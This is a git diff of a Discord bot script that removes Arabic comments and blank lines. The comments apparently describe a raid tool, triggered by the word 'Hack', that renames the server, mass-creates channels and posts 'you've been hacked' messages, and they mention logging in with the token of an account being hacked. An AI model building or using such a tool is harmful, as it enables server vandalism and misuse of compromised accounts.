@@ -8,9 +8,7 @@ const client = new Discord.Client();
 
 
 
-var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك
-
-//اسم البوت واسم السيرفر وصورهم وكل شئ
+var x_x = "Hack"
 
 client.on('message', message => {
  if (message.content === x_x) {
@@ -1289,7 +1287,6 @@ client.on('message', message => {
 
 
 
-//هنا اللي يسوي الرومات
 client.on('message', message => {
  if (message.content === x_x) {
   if (!message.channel.guild) return;
@@ -2439,7 +2436,6 @@ client.on('message', message => {
 
 });
 
-//هنا الرسايل تم تهكيرك وكذا
 
 client.on('message', message => {
  if (message.content === x_x) {
@@ -3891,14 +3887,6 @@ client.on('message', message => {
   message.author.sendEmbed(embed)
  }
 });
-
-
-
-
-
-
-
-
 
 
 client.login('BOT_TOKEN') //هنا توكن البوت او الحساب اللي بتهكره
